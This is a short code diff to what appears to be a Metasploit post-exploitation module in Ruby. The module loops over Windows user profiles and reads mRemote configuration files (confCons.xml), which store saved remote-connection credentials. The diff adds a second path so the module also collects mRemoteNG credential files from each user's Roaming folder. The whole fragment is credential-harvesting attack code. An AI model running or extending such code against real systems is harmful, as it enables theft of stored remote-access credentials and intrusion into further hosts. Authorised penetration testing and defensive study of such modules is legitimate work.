@@ -41,8 +41,10 @@ class Metasploit3 < Msf::Post
 
     grab_user_profiles().each do |user|
       next if user['LocalAppData'] == nil
-      tmpath= user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
+      tmpath  = user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
+      ng_path = user['LocalAppData'] + '\\..\\Roaming\\mRemoteNG\\confCons.xml'
       get_xml(tmpath)
+      get_xml(ng_path)
     end
   end
 
